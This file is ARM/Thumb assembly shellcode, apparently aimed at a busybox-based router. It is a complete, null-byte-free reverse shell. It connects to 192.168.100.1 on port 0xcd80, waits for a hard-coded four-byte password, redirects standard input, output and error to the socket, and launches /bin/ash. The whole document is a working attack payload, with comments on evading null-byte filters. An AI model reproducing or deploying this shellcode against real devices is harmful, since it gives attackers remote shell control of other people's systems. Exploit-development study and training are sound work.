.section .text
.global _start

_start:
.arm
    // Before doing anything else, switch to thumb mode for smaller instructions
    add r3, pc, #0x1
    bx r3

.thumb
    // Step 1: create a socket
    mov r0, #0x2
    mov r1, #0x1
    eor r2, r2  // zeroes out r2 without using null bytes
    mov r7, #200  // we can't move values greater than 256 in thumb mode...
    add r7, r7, #81  // ..so we do it in two parts
    svc #0x1  // syscall(socket, 2, 1, 0)
    mov r9, r0  // store the socket FD in r9

    // step 2: connect back to host
    // we still have the socket FD in r0
    adr r1, HOST
    strb r2, [r1, #0x1]  // insert a null byte after 0x2 in the protocol
    mov r2, #0x10
    add r7, #0x2  // since we already have 281, this is a quick way to get to 283
    svc #1  // connect(sockfd, HOST, 0x10)

    // step 3: read password until it's correct
    sub sp, #0x8  // make space for the password on the stack | subtract more than necessary to avoid null bytes in [sp]
    mov r1, sp
    add r1, r1, #0x4
    mov r2, #0x4
    mov r7, #0x3

    read_passwd:
        mov r0, r9
        svc #0x1  // read(sockfd, stack_buf, 4)

    check_passwd:
        ldr r3, PASSWORD
        ldr r4, [sp, #0x4]
        eor r3, r3, r4
    bne read_passwd

    // step 4: once we get the correct password, redirect stdin/stdout/stderr through it
    mov r1, #0x2
    mov r7, #63

    redirect_fd:
        mov r0, r9  // the old fd is always the socket...
        svc #1 // dup2(sockfd, (stderr/stdout/stdin)
        sub r1, r1, #0x1
    bpl redirect_fd  // loop until we've redirected streams 0, 1, and 2

    // step 5: finally, execve our shell :>
    // since the router uses busybox, we need to pass a fake argv containing our actual shell
    sub sp, sp, #0xc  // again, subtract more than needed to avoid null bytes in [sp]
    eor r2, r2  // zero r2 without null bytes
    str r2, [sp, #0x8] // put a null pointer at the end of argv
    adr r1, SHELL
    strb r2, [r1, #0x3]  // zero the byte at the end of ash\xff
    str r1, [sp, #0x4]  // and make it the first entry in our argv

    adr r0, BUSYBOX
    strb r2, [r0, #0x8]  // zero the byte at the end of /bin/ash\xff\xff\xff\xff
    mov r1, sp
    add r1, r1, #0x4
    mov r7, #11
    svc #1

    PADDING:
        .ascii "\xff\xff"

    HOST:
        .ascii "\x02\xff"  // protocol 2 = TCP | this \xff becomes a \x00 before it's used
        .ascii "\xcd\x80"  // port = cd80
        .byte 192,168,100,1  // ip: 192.168.100.1

    SHELL:
        .ascii "ash\xff"  // overwritten with a null byte before it's used

    BUSYBOX:
        .ascii "/bin/ash\xff\xff\xff\xff"  // first \xff is overwritten with a null byte

    PASSWORD:
        .ascii "cd80"
